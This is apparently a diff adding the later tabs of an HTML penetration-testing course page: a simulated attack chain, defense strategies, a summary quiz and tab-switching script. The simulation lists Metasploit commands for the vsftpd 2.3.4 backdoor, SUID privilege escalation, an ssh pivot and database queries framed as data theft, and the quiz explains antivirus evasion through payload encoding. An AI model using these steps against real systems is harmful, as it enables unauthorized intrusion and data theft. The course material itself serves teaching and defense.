+                                <span class="step-number">Step 1:</span> Initial Exploitation
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.1.80
+exploit
+# Result: Meterpreter shell gained</code>
+                                <p><span class="highlight">Result:</span> Remote code execution achieved on FTP server</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 2:</span> System Information Gathering
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>uname -a
+# Linux ftp-server 5.4.0 #1 SMP x86_64 GNU/Linux
+
+ifconfig
+# eth0 192.168.1.80 (external)
+# eth1 10.0.0.5 (internal network)</code>
+                                <p><span class="highlight">Result:</span> Discovered FTP server has access to internal network</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 3:</span> Lateral Movement Reconnaissance
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>arp -a
+# 10.0.0.1  (gateway)
+# 10.0.0.10 (database server - ACTIVE)
+# 10.0.0.20 (application server - ACTIVE)
+
+nmap -sn 10.0.0.0/24
+# Maps internal network topology</code>
+                                <p><span class="highlight">Result:</span> Identified target systems for lateral movement</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 4:</span> Privilege Escalation
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>find / -perm -4000 2>/dev/null
+# Identifies SUID binaries
+
+# Exploit SUID binary for root access
+./suid_binary -c "id"
+# uid=0(root) gid=0(root) groups=0(root)</code>
+                                <p><span class="highlight">Result:</span> Escalated from vsftpd user to root</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 5:</span> Pivot to Database Server
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code># From FTP server (now with root access):
+ssh -l root 10.0.0.10
+# Successfully logs into database server
+
+select * from employees;
+select * from financial_data;
+# Exfiltrates sensitive data</code>
+                                <p><span class="highlight">Result:</span> Complete compromise of internal network</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="learning-outcome">
+                        <h4>Learning Outcome:</h4>
+                        <ul>
+                            <li>Understand complete attack chain from initial access to data theft</li>
+                            <li>See how one compromised system becomes pivot point</li>
+                            <li>Recognize importance of network segmentation and defense-in-depth</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Key Lessons from Simulation Scenarios</h3>
+                    <ul>
+                        <li><strong>Chaining Vulnerabilities:</strong> Individual vulnerabilities become critical when combined</li>
+                        <li><strong>Information Cascade:</strong> Each compromise reveals more information for next attack</li>
+                        <li><strong>Least Privilege Principle:</strong> Even if one system compromised, damage limited by proper permission configuration</li>
+                        <li><strong>Network Isolation:</strong> Attackers often need to pivot; proper segmentation reduces this</li>
+                        <li><strong>Time Factor:</strong> More systems accessed = longer timeline = greater chance of detection</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 18: Defense Mechanisms -->
+            <section class="tab-content" id="tab18">
+                <h2>Defense Mechanisms and Mitigation Strategies</h2>
+                <p class="subtitle">Protecting systems against exploitation techniques covered in this module</p>
+
+                <div class="defense-layer">
+                    <h3>Layer 1: Prevention (Stop Attacks Before They Happen)</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>🛡️ Disable Vulnerable Protocols</h4>
+                        <ul>
+                            <li><strong>SMTP User Enumeration:</strong> Disable VRFY and EXPN commands in SMTP configuration</li>
+                            <li><strong>Plain-text FTP:</strong> Replace with SFTP (SSH File Transfer Protocol)</li>
+                            <li><strong>NetBIOS:</strong> Disable NetBIOS over port 139 if only internal network needs SMB</li>
+                            <li><strong>Legacy Services:</strong> Remove unneeded services entirely</li>
+                        </ul>
+                        <div class="config-example">
+                            <code># SMTP Configuration (disable VRFY/EXPN):
+disable_vrfy_command = YES
+disable_expn_command = YES</code>
+                        </div>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>🔐 Implement Authentication & Authorization</h4>
+                        <ul>
+                            <li><strong>FTP Authentication:</strong> Require strong credentials, disable anonymous access</li>
+                            <li><strong>SMB Share Permissions:</strong> Restrict share access by user/group</li>
+                            <li><strong>SMTP Relay Restriction:</strong> Only allow authenticated users to send mail</li>
+                            <li><strong>Principle of Least Privilege:</strong> Users only access what they need</li>
+                        </ul>
+                        <div class="config-example">
+                            <code># SMB Share Permissions:
+# Only HR department users access /HR/ share
+# Only Finance department users access /Finance/ share
+# Remove "Everyone" full access permissions</code>
+                        </div>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>📋 Configuration Hardening</h4>
+                        <ul>
+                            <li><strong>Disable Unnecessary Services:</strong> If FTP not needed, remove from servers</li>
+                            <li><strong>Change Default Settings:</strong> Don't use default credentials or configurations</li>
+                            <li><strong>Rate Limiting:</strong> Limit SMTP/FTP connection attempts</li>
+                            <li><strong>Banner Modifications:</strong> Don't reveal service version in banners</li>
+                        </ul>
+                        <div class="config-example">
+                            <code># Disable service version revealing:
+Banner: "220 SMTP Server Ready"  # Better
+# Instead of:
+Banner: "220 vsftpd 2.3.4"  # Reveals version</code>
+                        </div>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>🔄 Keep Systems Updated</h4>
+                        <ul>
+                            <li><strong>Security Patches:</strong> Apply immediately when available</li>
+                            <li><strong>Vulnerability Scanning:</strong> Regular scanning identifies vulnerable versions</li>
+                            <li><strong>End-of-Life Software:</strong> Don't use obsolete software no longer receiving patches</li>
+                            <li><strong>Example:</strong> VSFTPD 2.3.4 had vulnerability for 5+ years before awareness increased</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Layer 2: Detection (Identify Attacks in Progress)</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>👁️ Logging and Monitoring</h4>
+                        <ul>
+                            <li><strong>SMTP Logs:</strong> Log all VRFY/EXPN attempts, failed connections</li>
+                            <li><strong>FTP Logs:</strong> Log all connection attempts, file transfers, failed logins</li>
+                            <li><strong>SMB Audit:</strong> Log share accesses, permission changes, failed access attempts</li>
+                            <li><strong>Centralized Logging:</strong> Send all logs to central SIEM for correlation</li>
+                        </ul>
+                        <div class="log-example">
+                            <code>Alert: VRFY admin received 50 requests in 2 minutes
+Alert: Anonymous FTP login to TMT share
+Alert: 1000+ failed SMB connection attempts from 192.168.1.1
+Alert: Non-standard file upload to system share</code>
+                        </div>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>🚨 Intrusion Detection Systems (IDS)</h4>
+                        <ul>
+                            <li><strong>Network IDS:</strong> Detect exploitation traffic patterns</li>
+                            <li><strong>Host-based IDS:</strong> Detect suspicious process execution</li>
+                            <li><strong>Anomaly Detection:</strong> Alert on unusual SMTP/FTP/SMB usage</li>
+                            <li><strong>Signature Detection:</strong> Recognize known Metasploit exploitation patterns</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>📊 Security Information Event Management (SIEM)</h4>
+                        <ul>
+                            <li><strong>Correlate Events:</strong> Connect SMTP enumeration + later phishing click</li>
+                            <li><strong>Timeline Analysis:</strong> See complete attack sequence</li>
+                            <li><strong>Incident Detection:</strong> Alert security team automatically</li>
+                            <li><strong>Post-Incident Analysis:</strong> Analyze logs after compromise discovered</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Layer 3: Response (Contain and Recover)</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>🚨 Incident Response Plan</h4>
+                        <ul>
+                            <li><strong>Detection Procedure:</strong> Know how to identify active compromise</li>
+                            <li><strong>Isolation Procedure:</strong> How to disconnect compromised system</li>
+                            <li><strong>Evidence Preservation:</strong> Capture logs and memory before shutting down</li>
+                            <li><strong>Communication Protocol:</strong> Who to notify, escalation procedures</li>
+                            <li><strong>Recovery Procedure:</strong> How to restore system from backups</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>🔒 Backup and Recovery</h4>
+                        <ul>
+                            <li><strong>Regular Backups:</strong> Daily or more frequent for critical data</li>
+                            <li><strong>Offline Backups:</strong> Some backups disconnected from network (ransomware protection)</li>
+                            <li><strong>Recovery Testing:</strong> Regularly test restore procedures</li>
+                            <li><strong>Versioning:</strong> Keep multiple versions of backed-up data</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>🔐 Forensic Analysis</h4>
+                        <ul>
+                            <li><strong>Access Logs:</strong> Who accessed what data and when?</li>
+                            <li><strong>Process Analysis:</strong> What processes ran on compromised system?</li>
+                            <li><strong>Network Traffic:</strong> What data was exfiltrated?</li>
+                            <li><strong>Timeline Reconstruction:</strong> How long was system compromised?</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="defense-comparison">
+                    <h3>Exploitation vs Defense Timeline</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Time</th>
+                                <th>Attacker Activity</th>
+                                <th>Defense Opportunity</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>T+0 min</td>
+                                <td>Reconnaissance - SMTP enumeration</td>
+                                <td>DETECTION: Alert on VRFY spam</td>
+                            </tr>
+                            <tr>
+                                <td>T+5 min</td>
+                                <td>Weaponization - Create phishing email</td>
+                                <td>PREVENTION: Email filter blocks malicious attachment</td>
+                            </tr>
+                            <tr>
+                                <td>T+10 min</td>
+                                <td>Delivery - Send phishing email</td>
+                                <td>DETECTION: Email gateway logs suspicious email</td>
+                            </tr>
+                            <tr>
+                                <td>T+15 min</td>
+                                <td>Exploitation - User clicks link</td>
+                                <td>PREVENTION: Endpoint protection blocks exploit</td>
+                            </tr>
+                            <tr>
+                                <td>T+20 min</td>
+                                <td>Installation - Malware installed</td>
+                                <td>DETECTION: Behavioral analysis detects malware</td>
+                            </tr>
+                            <tr>
+                                <td>T+25 min</td>
+                                <td>C&C - Phone home for commands</td>
+                                <td>DETECTION: Network IDS blocks C&C connection</td>
+                            </tr>
+                            <tr>
+                                <td>T+30 min</td>
+                                <td>Actions - Steal data, plant backdoor</td>
+                                <td>RESPONSE: Isolate system, investigate</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ Defense in Depth:</strong> No single defense is perfect. Multiple layers mean even if one fails, others can catch the attack.
+                </div>
+            </section>
+
+            <!-- Tab 19: Summary & Best Practices -->
+            <section class="tab-content" id="tab19">
+                <h2>Module 5 Complete: Summary & Best Practices</h2>
+                <p class="subtitle">Comprehensive review and actionable recommendations</p>
+
+                <div class="summary-grid">
+                    <div class="summary-card">
+                        <h3>📧 SMTP Enumeration</h3>
+                        <ul>
+                            <li>User discovery via VRFY/EXPN commands</li>
+                            <li>Enables targeted phishing campaigns</li>
+                            <li>Mitigation: Disable commands, rate limit, implement authentication</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🐧 System Enumeration</h3>
+                        <ul>
+                            <li>Information gathering after access gained</li>
+                            <li>OS version reveals CVE information</li>
+                            <li>Service discovery enables further exploitation</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🔗 Network Protocols</h3>
+                        <ul>
+                            <li>SMB/NetBIOS data sharing vulnerabilities</li>
+                            <li>FTP unauthenticated or weak authentication</li>
+                            <li>Port 139/445/21 commonly targeted</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🔫 Metasploit Framework</h3>
+                        <ul>
+                            <li>Consolidated exploitation platform</li>
+                            <li>Exploit + Payload + Encoder workflow</li>
+                            <li>Post-exploitation module for persistence</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>💣 Exploitation Techniques</h3>
+                        <ul>
+                            <li>Vulnerability chaining for complete compromise</li>
+                            <li>Reverse shell more reliable than bind shell</li>
+                            <li>Payload encoding bypasses security mechanisms</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🎯 Attack Chain</h3>
+                        <ul>
+                            <li>7-stage kill chain model</li>
+                            <li>Break chain at any stage to stop attack</li>
+                            <li>Defense-in-depth required for protection</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="evaluation-section">
+                    <h3>Knowledge Check</h3>
+                    <div class="quiz-container">
+                        <div class="quiz-question">
+                            <p><strong>Q1:</strong> What command validates if a user exists on SMTP server?</p>
+                            <button onclick="toggleAnswer(this)">Show Answer</button>
+                            <p class="quiz-answer" style="display:none;"><strong>Answer:</strong> VRFY (Verify) command - sends different responses for valid/invalid users</p>
+                        </div>
+
+                        <div class="quiz-question">
+                            <p><strong>Q2:</strong> Why is reverse TCP payload preferred over bind TCP?</p>
+                            <button onclick="toggleAnswer(this)">Show Answer</button>
+                            <p class="quiz-answer" style="display:none;"><strong>Answer:</strong> Target initiates connection so attacker only needs target IP. If network changes, attacker doesn't need rescanning. Works through most firewalls.</p>
+                        </div>
+
+                        <div class="quiz-question">
+                            <p><strong>Q3:</strong> Which port is MOST critical if exposed externally?</p>
+                            <button onclick="toggleAnswer(this)">Show Answer</button>
+                            <p class="quiz-answer" style="display:none;"><strong>Answer:</strong> Port 139 (NetBIOS over SMB) - enables direct share enumeration and unauthenticated data access</p>
+                        </div>
+
+                        <div class="quiz-question">
+                            <p><strong>Q4:</strong> What is the purpose of payload encoding in Metasploit?</p>
+                            <button onclick="toggleAnswer(this)">Show Answer</button>
+                            <p class="quiz-answer" style="display:none;"><strong>Answer:</strong> Evade detection by antivirus, IDS/IPS, and content filters. Shikata Ga Nai is a popular polymorphic encoder.</p>
+                        </div>
+
+                        <div class="quiz-question">
+                            <p><strong>Q5:</strong> What happens at Stage 6 (Command & Control) in the Kill Chain?</p>
+                            <button onclick="toggleAnswer(this)">Show Answer</button>
+                            <p class="quiz-answer" style="display:none;"><strong>Answer:</strong> Compromised system establishes communication with attacker's C&C server for command reception and data exfiltration</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="best-practices-section">
+                    <h3>🎓 For Ethical Hackers / Penetration Testers</h3>
+                    <ul>
+                        <li>Always obtain written authorization before testing</li>
+                        <li>Use isolated labs, never test production systems without approval</li>
+                        <li>Chain multiple vulnerabilities to demonstrate real risk</li>
+                        <li>Document every exploit step for POC reports</li>
+                        <li>Practice multiple exploitation methods for same vulnerability</li>
+                        <li>Stay current with new CVEs and exploit techniques</li>
+                        <li>Understand both offensive and defensive perspectives</li>
+                    </ul>
+                </div>
+
+                <div class="best-practices-section">
+                    <h3>🛡️ For System Administrators / Security Teams</h3>
+                    <ul>
+                        <li>Implement defense-in-depth: prevention, detection, and response</li>
+                        <li>Disable unnecessary services and protocols</li>
+                        <li>Apply security patches immediately when available</li>
+                        <li>Implement proper logging and centralized SIEM collection</li>
+                        <li>Conduct regular vulnerability scans and penetration tests</li>
+                        <li>Segment network to limit lateral movement</li>
+                        <li>Maintain offline backups for disaster recovery</li>
+                        <li>Train employees on security awareness and phishing</li>
+                    </ul>
+                </div>
+
+                <div class="best-practices-section">
+                    <h3>📚 Continued Learning Path</h3>
+                    <ul>
+                        <li><strong>Module 6:</strong> Privilege Escalation techniques on Windows and Linux</li>
+                        <li><strong>Module 7:</strong> Post-exploitation persistence and lateral movement</li>
+                        <li><strong>Module 8:</strong> Web application vulnerabilities (SQL injection, XSS, etc.)</li>
+                        <li><strong>Module 9:</strong> Wireless network security and cracking</li>
+                        <li><strong>Module 10:</strong> Social engineering and physical security</li>
+                        <li><strong>Module 11+:</strong> Advanced topics and specialized domains</li>
+                    </ul>
+                </div>
+
+                <div class="achievement-box">
+                    <h3>🏆 Congratulations on Completing Module 5!</h3>
+                    <p>You've successfully learned:</p>
+                    <ul>
+                        <li>✓ Service enumeration and user discovery techniques</li>
+                        <li>✓ System information gathering methodologies</li>
+                        <li>✓ Network protocol exploitation and vulnerabilities</li>
+                        <li>✓ Metasploit Framework mastery and module types</li>
+                        <li>✓ Payload creation, encoding, and delivery mechanisms</li>
+                        <li>✓ Remote code execution and post-exploitation</li>
+                        <li>✓ Complete attack chains and vulnerability combinations</li>
+                        <li>✓ Defense mechanisms and mitigation strategies</li>
+                    </ul>
+                    <p><strong>Next Step:</strong> Continue to Module 6 to learn about privilege escalation and maintain system access!</p>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Script -->
+    <script>
+        function switchTab(tabName) {
+            // Hide all tabs
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // Show selected tab
+            const selectedTab = document.getElementById(tabName);
+            if (selectedTab) {
+                selectedTab.classList.add('active');
+                
+                // Update breadcrumb
+                updateBreadcrumb(tabName);
+                
+                // Scroll to top
+                window.scrollTo(0, 0);
+            }
+        }
+
+        function updateBreadcrumb(tabName) {
+            const breadcrumbMap = {
+                'tab1': 'Overview',
+                'tab2': 'SMTP Enumeration',
+                'tab3': 'VRFY & EXPN Commands',
+                'tab4': 'Linux Enumeration',
+                'tab5': 'System Details & Services',
+                'tab6': 'Process Monitoring',
+                'tab7': 'SMB/NetBIOS Protocol',
+                'tab8': 'SMB Exploitation',
+                'tab9': 'FTP Service',
+                'tab10': 'Metasploit Framework Basics',
+                'tab11': 'Metasploit Modules',
+                'tab12': 'Payloads & Encoders',
+                'tab13': 'Wayback Machine',
+                'tab14': 'VSFTPD Exploit',
+                'tab15': 'Remote Code Execution',
+                'tab16': 'Attack Chain Theory',
+                'tab17': 'Simulation Scenarios',
+                'tab18': 'Defense Mechanisms',
+                'tab19': 'Summary & Best Practices'
+            };
+            
+            const breadcrumbElement = document.getElementById('breadcrumb-current');
+            if (breadcrumbElement) {
+                breadcrumbElement.textContent = breadcrumbMap[tabName] || 'Content';
+            }
+            
+            // Update active sidebar link
+            const sidebarLinks = document.querySelectorAll('.sidebar-links a');
+            sidebarLinks.forEach(link => {
+                link.style.color = '';
+                link.style.fontWeight = '';
+            });
+            
+            const activeLink = document.querySelector(`.sidebar-links a[onclick="switchTab('${tabName}')"]`);
+            if (activeLink) {
+                activeLink.style.color = '#00ff88';
+                activeLink.style.fontWeight = 'bold';
+            }
+        }
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Toggle simulation steps
+        function toggleSimStep(element) {
+            const content = element.querySelector('.step-content');
+            const icon = element.querySelector('.toggle-icon');
+            
+            // Close other open steps in the same container
+            const container = element.closest('.simulation-box');
+            if (container) {
+                const otherSteps = container.querySelectorAll('.sim-step');
+                otherSteps.forEach(step => {
+                    if (step !== element) {
+                        const stepContent = step.querySelector('.step-content');
+                        const stepIcon = step.querySelector('.toggle-icon');
+                        if (stepContent) {
+                            stepContent.classList.remove('active');
+                            stepContent.style.display = 'none';
+                        }
+                        if (stepIcon) {
+                            stepIcon.style.transform = 'rotate(0deg)';
+                        }
+                    }
+                });
+            }
+            
+            // Toggle current step
+            if (content) {
+                content.classList.toggle('active');
+                content.style.display = content.classList.contains('active') ? 'block' : 'none';
+            }
+            
+            if (icon) {
+                icon.style.transform = content.classList.contains('active') ? 'rotate(180deg)' : 'rotate(0deg)';
+            }
+        }
+
+        // Toggle quiz answers
+        function toggleAnswer(button) {
+            const answer = button.nextElementSibling;
+            if (answer && answer.classList.contains('quiz-answer')) {
+                const isHidden = answer.style.display === 'none';
+                answer.style.display = isHidden ? 'block' : 'none';
+                button.textContent = isHidden ? 'Hide Answer' : 'Show Answer';
+            }
+        }
+
+        // Interactive chain stage click
+        document.addEventListener('DOMContentLoaded', () => {
+            const chainStages = document.querySelectorAll('.chain-stage');
+            chainStages.forEach(stage => {
+                stage.addEventListener('click', function() {
+                    const stageName = this.getAttribute('data-stage');
+                    console.log('Clicked stage: ' + stageName);
+                    // Could add tooltip or additional info here
+                });
+            });
+        });
+
+        // Set first tab as active on load
+        window.addEventListener('load', () => {
+            switchTab('tab1');
+        });
+    </script>
+</body>
+</html>
